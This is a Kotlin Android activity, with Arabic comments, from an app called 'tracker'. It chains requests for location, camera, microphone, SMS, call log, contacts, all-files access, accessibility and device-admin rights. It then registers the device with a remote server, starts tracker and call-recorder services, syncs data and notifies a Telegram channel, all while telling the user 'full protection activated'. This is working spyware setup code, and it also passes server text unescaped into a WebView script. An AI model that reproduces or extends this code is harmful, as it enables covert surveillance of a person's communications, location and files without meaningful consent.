package com.abuzahra.tracker

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.PowerManager
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.abuzahra.tracker.receivers.MyDeviceAdminReceiver
import com.abuzahra.tracker.services.CallRecorderService
import com.abuzahra.tracker.services.DataSyncWorker
import com.abuzahra.tracker.services.MainTrackerService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {

    lateinit var webView: WebView
    private val PERMISSIONS_REQUEST_CODE = 101
    private var isSetupComplete = false
    private var permissionBatchIndex = 0

    /**
     * مراحل الأذونات - مراحل شاملة
     * لا يتم تخطي أي مرحلة أبداً
     */
    private enum class SetupStep(val id: Int) {
        BASIC_RUNTIME(0),           // أذونات التشغيل العادية (مقسمة لعدة دفعات)
        ALL_FILES_ACCESS(1),        // الوصول الكامل للملفات (Android 11+)
        WRITE_SETTINGS(2),          // تعديل إعدادات النظام
        BATTERY_OPTIMIZATION(3),    // تجاهل تحسين البطارية
        OVERLAY(4),                 // عرض فوق التطبيقات
        USAGE_STATS(5),             // إحصائيات الاستخدام
        NOTIFICATION_LISTENER(6),   // مستمع الإشعارات
        ACCESSIBILITY(7),           // خدمة إمكانية الوصول
        DEVICE_ADMIN(8),            // مسؤول الجهاز
        LINK_CODE(9),              // إدخال كود الربط من السيرفر
        COMPLETE(10);              // اكتمال التفعيل

        fun next(): SetupStep? = entries.getOrNull(id + 1)
    }

    private var currentStep: SetupStep = SetupStep.BASIC_RUNTIME
    private var currentActivityResultCode = -1

    // ==================== أذونات التشغيل الشاملة ====================
    // مقسمة لـ 6 دفعات لضمان ظهور كل الأذونات على جميع أجهزة أندرويد
    private fun getPermissionBatches(): List<List<String>> {
        val batch1 = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
        )
        val batch2 = mutableListOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
        )
        val batch3 = mutableListOf(
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.ANSWER_PHONE_CALLS,
            Manifest.permission.CALL_PHONE
        )
        val batch4 = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS
        )
        val batch5 = mutableListOf<String>()
        // أذونات الوسائط حسب إصدار أندرويد
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            batch5.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            batch5.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            batch5.add(Manifest.permission.READ_MEDIA_IMAGES)
            batch5.add(Manifest.permission.READ_MEDIA_VIDEO)
            batch5.add(Manifest.permission.READ_MEDIA_AUDIO)
            batch5.add(Manifest.permission.POST_NOTIFICATIONS)
            batch5.add(Manifest.permission.BODY_SENSORS)
            batch5.add(Manifest.permission.ACTIVITY_RECOGNITION)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            batch5.add(Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED)
        }
        // دفعة الموقع الخلفي (يجب أن تكون منفصلة على Android 10+)
        val batch6 = mutableListOf<String>()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            batch6.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }

        return listOf(batch1, batch2, batch3, batch4, batch5, batch6).filter { it.isNotEmpty() }
    }

    // ==================== دورة حياة النشاط ====================

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        webView = findViewById(R.id.webview)
        setupWebView()

        Log.d("MainActivity", "=== بدء مراحل الأذونات والتفعيل ===")
        currentStep = SetupStep.BASIC_RUNTIME
        isSetupComplete = false
        checkAndRequestPermissions()
    }

    private fun setupWebView() {
        val webSettings: WebSettings = webView.settings
        webSettings.javaScriptEnabled = true
        webSettings.domStorageEnabled = true
        webSettings.cacheMode = WebSettings.LOAD_DEFAULT
        webSettings.allowFileAccess = true
        webView.addJavascriptInterface(ChildWebInterface(this), "AndroidNative")
        webView.webViewClient = WebViewClient()
        webView.loadUrl("file:///android_asset/child_index.html")
    }

    // ==================== نظام الأذونات ====================

    private fun checkAndRequestPermissions() {
        val step = currentStep
        val stepNum = step.id + 1
        val totalSteps = 10
        jsNotify("onPermissionStep", "$stepNum/$totalSteps")

        when (step) {
            SetupStep.BASIC_RUNTIME -> requestBasicPermissions()
            SetupStep.ALL_FILES_ACCESS -> requestAllFilesAccess()
            SetupStep.WRITE_SETTINGS -> requestWriteSettingsPermission()
            SetupStep.BATTERY_OPTIMIZATION -> requestBatteryOptimization()
            SetupStep.OVERLAY -> requestOverlayPermission()
            SetupStep.USAGE_STATS -> requestUsageStatsPermission()
            SetupStep.NOTIFICATION_LISTENER -> requestNotificationPermission()
            SetupStep.ACCESSIBILITY -> requestAccessibilityPermission()
            SetupStep.DEVICE_ADMIN -> requestDeviceAdminPermission()
            SetupStep.LINK_CODE -> showLinkCodeInput()
            SetupStep.COMPLETE -> onAllSetupComplete()
        }
    }

    // ========== الخطوة 1: الأذونات الأساسية (مقسمة لدفعات) ==========
    private fun requestBasicPermissions() {
        jsNotify("onPermissionPending", "basic")
        permissionBatchIndex = 0
        requestNextPermissionBatch()
    }

    private fun requestNextPermissionBatch() {
        val batches = getPermissionBatches()
        if (permissionBatchIndex >= batches.size) {
            Log.d("MainActivity", "✅ تم طلب جميع دفعات الأذونات الأساسية")
            jsNotify("onPermissionGranted", "basic")
            advanceToNextStep()
            return
        }

        val batch = batches[permissionBatchIndex]
        val missing = batch.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        val batchNum = permissionBatchIndex + 1
        val totalBatches = batches.size
        Log.d("MainActivity", "📋 دفعة أذونات $batchNum/$totalBatches: ${missing.joinToString()}")

        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing, PERMISSIONS_REQUEST_CODE)
        } else {
            permissionBatchIndex++
            requestNextPermissionBatch()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSIONS_REQUEST_CODE) {
            val grantedCount = grantResults.count { it == PackageManager.PERMISSION_GRANTED }
            val total = grantResults.size
            Log.d("MainActivity", "📋 نتيجة الأذونات: $grantedCount/$total")

            if (grantedCount < total) {
                Log.w("MainActivity", "⚠️ لم يتم منح جميع الأذونات - نكمل")
                jsNotify("onPermissionWarning", "basic:$grantedCount/$total")
            }

            // الانتقال للدفعة التالية
            permissionBatchIndex++
            requestNextPermissionBatch()
        }
    }

    // ========== الخطوة 2: الوصول الكامل للملفات ==========
    @Suppress("DEPRECATION")
    private fun requestAllFilesAccess() {
        jsNotify("onPermissionPending", "all_files")

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (Environment.isExternalStorageManager()) {
                Log.d("MainActivity", "✅ الوصول الكامل للملفات مفعّل مسبقاً")
                jsNotify("onPermissionGranted", "all_files")
                advanceToNextStep()
            } else {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    intent.data = Uri.parse("package:$packageName")
                    startActivityForResult(intent, SetupStep.ALL_FILES_ACCESS.id)
                } catch (e: Exception) {
                    Log.e("MainActivity", "خطأ في طلب الوصول الكامل: ${e.message}")
                    // Fallback
                    try {
                        val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                        startActivityForResult(intent, SetupStep.ALL_FILES_ACCESS.id)
                    } catch (e2: Exception) {
                        Log.e("MainActivity", "خطأ في Fallback: ${e2.message}")
                        jsNotify("onPermissionError", "all_files")
                        advanceToNextStep()
                    }
                }
            }
        } else {
            // Android 10 وأقل - أذونات التخزين العادية تكفي
            Log.d("MainActivity", "✅ Android ${Build.VERSION.SDK_INT} - الوصول الكامل متوفر عبر الأذونات العادية")
            jsNotify("onPermissionGranted", "all_files")
            advanceToNextStep()
        }
    }

    // ========== الخطوة 3: تعديل إعدادات النظام ==========
    private fun requestWriteSettingsPermission() {
        jsNotify("onPermissionPending", "write_settings")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (Settings.System.canWrite(this)) {
                Log.d("MainActivity", "✅ صلاحية تعديل الإعدادات مفعّلة مسبقاً")
                jsNotify("onPermissionGranted", "write_settings")
                advanceToNextStep()
            } else {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS)
                    intent.data = Uri.parse("package:$packageName")
                    startActivityForResult(intent, SetupStep.WRITE_SETTINGS.id)
                } catch (e: Exception) {
                    Log.e("MainActivity", "خطأ في طلب صلاحية الإعدادات: ${e.message}")
                    jsNotify("onPermissionError", "write_settings")
                    advanceToNextStep()
                }
            }
        } else {
            Log.d("MainActivity", "✅ Android ${Build.VERSION.SDK_INT} - صلاحية الإعدادات متوفرة افتراضياً")
            jsNotify("onPermissionGranted", "write_settings")
            advanceToNextStep()
        }
    }

    // ========== الخطوة 4: تحسين البطارية ==========
    private fun requestBatteryOptimization() {
        jsNotify("onPermissionPending", "battery")
        val pwrm = getSystemService(Context.POWER_SERVICE) as PowerManager
        if (pwrm.isIgnoringBatteryOptimizations(packageName)) {
            Log.d("MainActivity", "✅ تحسين البطارية مُلغى مسبقاً")
            jsNotify("onPermissionGranted", "battery")
            advanceToNextStep()
        } else {
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                intent.data = Uri.parse("package:$packageName")
                startActivityForResult(intent, SetupStep.BATTERY_OPTIMIZATION.id)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في طلب تحسين البطارية: ${e.message}")
                jsNotify("onPermissionError", "battery")
                advanceToNextStep()
            }
        }
    }

    // ========== الخطوة 4: العرض فوق التطبيقات ==========
    private fun requestOverlayPermission() {
        jsNotify("onPermissionPending", "overlay")
        if (Settings.canDrawOverlays(this)) {
            Log.d("MainActivity", "✅ إذن العرض فوق التطبيقات مفعّل مسبقاً")
            jsNotify("onPermissionGranted", "overlay")
            advanceToNextStep()
        } else {
            try {
                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
                startActivityForResult(intent, SetupStep.OVERLAY.id)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في طلب إذن العرض: ${e.message}")
                jsNotify("onPermissionError", "overlay")
                advanceToNextStep()
            }
        }
    }

    // ========== الخطوة 5: إحصائيات الاستخدام ==========
    private fun requestUsageStatsPermission() {
        jsNotify("onPermissionPending", "usage")
        if (hasUsageStatsPermission()) {
            Log.d("MainActivity", "✅ إذن إحصائيات الاستخدام مفعّل مسبقاً")
            jsNotify("onPermissionGranted", "usage")
            advanceToNextStep()
        } else {
            try {
                startActivityForResult(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS), SetupStep.USAGE_STATS.id)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في طلب إذن الاستخدام: ${e.message}")
                jsNotify("onPermissionError", "usage")
                advanceToNextStep()
            }
        }
    }

    // ========== الخطوة 6: مستمع الإشعارات ==========
    private fun requestNotificationPermission() {
        jsNotify("onPermissionPending", "notif")
        if (isNotificationServiceEnabled()) {
            Log.d("MainActivity", "✅ مستمع الإشعارات مفعّل مسبقاً")
            jsNotify("onPermissionGranted", "notif")
            advanceToNextStep()
        } else {
            try {
                startActivityForResult(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"), SetupStep.NOTIFICATION_LISTENER.id)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في طلب إذن الإشعارات: ${e.message}")
                jsNotify("onPermissionError", "notif")
                advanceToNextStep()
            }
        }
    }

    // ========== الخطوة 7: إمكانية الوصول ==========
    private fun requestAccessibilityPermission() {
        jsNotify("onPermissionPending", "access")
        if (isAccessibilityServiceEnabled()) {
            Log.d("MainActivity", "✅ خدمة إمكانية الوصول مفعّلة مسبقاً")
            jsNotify("onPermissionGranted", "access")
            advanceToNextStep()
        } else {
            try {
                startActivityForResult(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), SetupStep.ACCESSIBILITY.id)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في طلب إذن الوصول: ${e.message}")
                jsNotify("onPermissionError", "access")
                advanceToNextStep()
            }
        }
    }

    // ========== الخطوة 8: مسؤول الجهاز ==========
    private fun requestDeviceAdminPermission() {
        jsNotify("onPermissionPending", "admin")
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val componentName = ComponentName(this, MyDeviceAdminReceiver::class.java)
        if (dpm.isAdminActive(componentName)) {
            Log.d("MainActivity", "✅ مسؤول الجهاز مفعّل مسبقاً")
            jsNotify("onPermissionGranted", "admin")
            advanceToNextStep()
        } else {
            try {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
                startActivityForResult(intent, SetupStep.DEVICE_ADMIN.id)
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في طلب تفعيل مسؤول الجهاز: ${e.message}")
                jsNotify("onPermissionError", "admin")
                advanceToNextStep()
            }
        }
    }

    // ========== الخطوة 9: كود الربط ==========
    private fun showLinkCodeInput() {
        jsNotify("onPermissionPending", "link")
        jsCall("showLinkCodeInput()")
    }

    /**
     * ربط الجهاز مع السيرفر باستخدام كود الربط
     * الكود يكون مدى الحياة وربط جهاز واحد فقط
     */
    fun verifyLinkCode(code: String) {
        CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
            try {
                Log.d("MainActivity", "🔄 جاري ربط الجهاز مع السيرفر: $code")
                // إظهار حالة الربط في الواجهة
                runOnUiThread {
                    jsCall("onLinking()")
                }

                val url = URL("https://alsydyabwalzhra.online/api/verify_link")
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.connectTimeout = 15000
                connection.readTimeout = 15000
                connection.doOutput = true

                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                    ?: System.currentTimeMillis().toString()

                val payload = """{"code":"$code","device_id":"$deviceId","model":"${Build.MODEL}","brand":"${Build.BRAND}","android":"${Build.VERSION.RELEASE}","sdk":"${Build.VERSION.SDK_INT}"}"""

                OutputStreamWriter(connection.outputStream, "UTF-8").use { it.write(payload) }

                val responseCode = connection.responseCode
                val response = if (responseCode in 200..299) {
                    connection.inputStream?.bufferedReader()?.readText() ?: ""
                } else {
                    connection.errorStream?.bufferedReader()?.readText() ?: ""
                }

                Log.d("MainActivity", "استجابة السيرفر: $responseCode - $response")

                if (responseCode in 200..299) {
                    val jsonResponse = try {
                        org.json.JSONObject(response)
                    } catch (e: Exception) {
                        Log.e("MainActivity", "❌ استجابة غير صالحة من السيرفر: $response")
                        runOnUiThread {
                            jsCall("onLinkError('استجابة غير صالحة من السيرفر. حاول مرة أخرى.')")
                        }
                        return@launch
                    }

                    if (jsonResponse.optBoolean("ok", false)) {
                        Log.d("MainActivity", "✅ تم ربط الجهاز بنجاح!")
                        SharedPrefsManager.setLinkCode(this@MainActivity, code)
                        SharedPrefsManager.setDeviceId(this@MainActivity, deviceId)
                        SharedPrefsManager.setBotRegistered(this@MainActivity, true)

                        runOnUiThread {
                            jsCall("onLinkSuccess()")
                            jsNotify("onPermissionGranted", "link")
                            advanceToNextStep()
                        }
                    } else {
                        val errorMsg = jsonResponse.optString("error", "خطأ غير معروف")
                        Log.e("MainActivity", "❌ فشل الربط: $errorMsg")
                        val userMsg = when {
                            errorMsg.contains("expired", ignoreCase = true) -> "كود الربط منتهي الصلاحية"
                            errorMsg.contains("Invalid", ignoreCase = true) || errorMsg.contains("invalid", ignoreCase = true) -> "الكود غير صحيح"
                            errorMsg.contains("used", ignoreCase = true) -> "هذا الكود تم استخدامه مسبقاً"
                            else -> errorMsg
                        }
                        runOnUiThread {
                            jsCall("onLinkError('$userMsg')")
                        }
                    }
                } else {
                    val userMsg = when {
                        responseCode == 400 -> "الكود غير صحيح أو تم استخدامه"
                        responseCode == 404 -> "السيرفر غير متاح"
                        responseCode >= 500 -> "خطأ في السيرفر حاول بعد قليل"
                        else -> "خطأ في الاتصال رمز $responseCode"
                    }
                    runOnUiThread {
                        jsCall("onLinkError('$userMsg')")
                    }
                }
            } catch (e: java.net.SocketTimeoutException) {
                runOnUiThread {
                    jsCall("onLinkError('انتهت مهلة الاتصال بالسيرفر تأكد من اتصال الإنترنت')")
                }
            } catch (e: java.net.UnknownHostException) {
                runOnUiThread {
                    jsCall("onLinkError('لا يمكن الوصول للسيرفر تأكد من اتصال الإنترنت')")
                }
            } catch (e: javax.net.ssl.SSLException) {
                runOnUiThread {
                    jsCall("onLinkError('خطأ في الاتصال الآمن حاول مرة أخرى')")
                }
            } catch (e: Exception) {
                runOnUiThread {
                    jsCall("onLinkError('خطأ في الاتصال: ${e.message}')")
                }
            }
        }
    }

    // ========== الخطوة 10: اكتمال التفعيل ==========

    private fun onAllSetupComplete() {
        if (isSetupComplete) return
        isSetupComplete = true

        Log.d("MainActivity", "✅ جميع الأذونات مكتملة - بدء التشغيل")
        Toast.makeText(this, "تم تفعيل الحماية الكاملة", Toast.LENGTH_SHORT).show()

        SharedPrefsManager.markSetupCompleted(this)

        startAllServices()
        ensureDeviceId()

        val deviceInfo = buildDeviceInfoHtml()
        jsCall("onAllPermissionsComplete('$deviceInfo')")

        // إنشاء النسخة الاحتياطية الأولى
        CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
            try {
                Log.d("MainActivity", "🔄 بدء النسخة الاحتياطية الأولى...")
                LocalStorageManager.createFullBackup(this@MainActivity)
                Log.d("MainActivity", "✅ تم إنشاء النسخة الاحتياطية الأولى")
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في النسخة الاحتياطية: ${e.message}")
            }
        }

        // إرسال إشعار للتليجرام (بدون getUpdates - الإرسال فقط)
        val deviceId = SharedPrefsManager.getDeviceId(this) ?: "غير معروف"
        CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
            try {
                TelegramDirectClient.sendStartupNotification(this@MainActivity)
                jsCall("onTelegramConnected('تم الاتصال بتيليجرام بنجاح')")
            } catch (e: Exception) {
                Log.e("MainActivity", "خطأ في إرسال الإشعار: ${e.message}")
                jsCall("onSetupError('خطأ في الإرسال: ${e.message}')")
            }
        }
    }

    // ==================== onActivityResult - مفتاح سلسلة الأذونات ====================

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        currentActivityResultCode = requestCode

        if (!isSetupComplete) {
            webView.postDelayed({
                checkCurrentStepAndAdvance()
            }, 800)
        }
    }

    override fun onResume() {
        super.onResume()
        if (!isSetupComplete && currentActivityResultCode >= 0) {
            webView.postDelayed({
                checkCurrentStepAndAdvance()
            }, 800)
        }
    }

    private fun checkCurrentStepAndAdvance() {
        if (isSetupComplete) return

        val granted = when (currentStep) {
            SetupStep.BASIC_RUNTIME -> true // تم معالجته في onRequestPermissionsResult
            SetupStep.ALL_FILES_ACCESS -> isAllFilesAccessGranted()
            SetupStep.WRITE_SETTINGS -> isWriteSettingsGranted()
            SetupStep.BATTERY_OPTIMIZATION -> isIgnoringBattery()
            SetupStep.OVERLAY -> Settings.canDrawOverlays(this)
            SetupStep.USAGE_STATS -> hasUsageStatsPermission()
            SetupStep.NOTIFICATION_LISTENER -> isNotificationServiceEnabled()
            SetupStep.ACCESSIBILITY -> isAccessibilityServiceEnabled()
            SetupStep.DEVICE_ADMIN -> isDeviceAdminActive()
            SetupStep.LINK_CODE -> false // كود الربط لا يُفحص تلقائياً
            SetupStep.COMPLETE -> false
        }

        if (granted) {
            val stepName = when (currentStep) {
                SetupStep.BASIC_RUNTIME -> "basic"
                SetupStep.ALL_FILES_ACCESS -> "all_files"
                SetupStep.WRITE_SETTINGS -> "write_settings"
                SetupStep.BATTERY_OPTIMIZATION -> "battery"
                SetupStep.OVERLAY -> "overlay"
                SetupStep.USAGE_STATS -> "usage"
                SetupStep.NOTIFICATION_LISTENER -> "notif"
                SetupStep.ACCESSIBILITY -> "access"
                SetupStep.DEVICE_ADMIN -> "admin"
                SetupStep.LINK_CODE -> "link"
                SetupStep.COMPLETE -> "complete"
            }
            Log.d("MainActivity", "✅ تم منح الإذن: $stepName")
            jsNotify("onPermissionGranted", stepName)
            advanceToNextStep()
        } else if (currentStep != SetupStep.BASIC_RUNTIME && currentStep != SetupStep.LINK_CODE) {
            // حتى لو لم يُمنح الإذن، نكمل (لكن نسجل تحذير)
            Log.w("MainActivity", "⚠️ الإذن ${currentStep.name} لم يُمنح - نكمل")
        }
    }

    private fun advanceToNextStep() {
        val next = currentStep.next()
        if (next != null) {
            currentStep = next
            checkAndRequestPermissions()
        } else {
            onAllSetupComplete()
        }
    }

    // ==================== دوال مساعدة ====================

    private fun isWriteSettingsGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.System.canWrite(this)
        } else {
            true
        }
    }

    private fun isAllFilesAccessGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else {
            true // أندرويد 10 وأقل - أذونات التخزين العادية تكفي
        }
    }

    private fun isIgnoringBattery(): Boolean {
        return (getSystemService(Context.POWER_SERVICE) as PowerManager)
            .isIgnoringBatteryOptimizations(packageName)
    }

    private fun hasUsageStatsPermission(): Boolean {
        return try {
            val appOps = getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
            appOps.checkOpNoThrow(
                android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(), packageName
            ) == android.app.AppOpsManager.MODE_ALLOWED
        } catch (e: Exception) {
            Log.e("MainActivity", "خطأ في فحص إذن الاستخدام: ${e.message}")
            false
        }
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(packageName)
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        return try {
            val enabled = Settings.Secure.getInt(contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED, 0)
            if (enabled != 1) return false
            val settingValue = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
            if (settingValue != null) {
                val splitter = TextUtils.SimpleStringSplitter(':')
                splitter.setString(settingValue)
                while (splitter.hasNext()) {
                    if (splitter.next().equals("${packageName}/com.abuzahra.tracker.services.MyAccessibilityService", ignoreCase = true)) {
                        return true
                    }
                }
            }
            false
        } catch (e: Exception) {
            Log.e("MainActivity", "خطأ في فحص خدمة إمكانية الوصول: ${e.message}")
            false
        }
    }

    private fun isDeviceAdminActive(): Boolean {
        return try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val componentName = ComponentName(this, MyDeviceAdminReceiver::class.java)
            dpm.isAdminActive(componentName)
        } catch (e: Exception) {
            Log.e("MainActivity", "خطأ في فحص مسؤول الجهاز: ${e.message}")
            false
        }
    }

    private fun ensureDeviceId() {
        if (SharedPrefsManager.getDeviceId(this) == null) {
            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                ?: System.currentTimeMillis().toString()
            SharedPrefsManager.saveData(this, "direct_telegram", androidId)
        }
    }

    private fun buildDeviceInfoHtml(): String {
        return "📱 الموديل: <b>${Build.MODEL}</b><br>" +
               "🏢 الشركة: <b>${Build.BRAND}</b><br>" +
               "🤖 أندرويد: <b>${Build.VERSION.RELEASE}</b> (API ${Build.VERSION.SDK_INT})<br>" +
               "🆔 المعرف: <code>${SharedPrefsManager.getDeviceId(this) ?: "غير معروف"}</code><br>" +
               "🟢 الحالة: متصل بتيليجرام مباشرة"
    }

    private fun startAllServices() {
        try {
            Log.d("MainActivity", "🚀 بدء تشغيل جميع الخدمات...")
            val trackerIntent = Intent(this, MainTrackerService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(trackerIntent) else startService(trackerIntent)

            val callIntent = Intent(this, CallRecorderService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(callIntent) else startService(callIntent)

            DataSyncWorker.startImmediate(this)
            Log.d("MainActivity", "✅ تم بدء جميع الخدمات بنجاح")
        } catch (e: Exception) {
            Log.e("MainActivity", "خطأ في بدء الخدمات: ${e.message}", e)
        }
    }

    // ==================== جسر JavaScript ====================

    private fun jsNotify(method: String, arg: String) {
        webView.post {
            try { webView.evaluateJavascript("window.$method('$arg')", null) }
            catch (e: Exception) { Log.e("MainActivity", "خطأ JS: ${e.message}") }
        }
    }

    private fun jsCall(script: String) {
        webView.post {
            try { webView.evaluateJavascript(script, null) }
            catch (e: Exception) { Log.e("MainActivity", "خطأ JS: ${e.message}") }
        }
    }

    fun startWorker() { DataSyncWorker.startImmediate(this) }
}
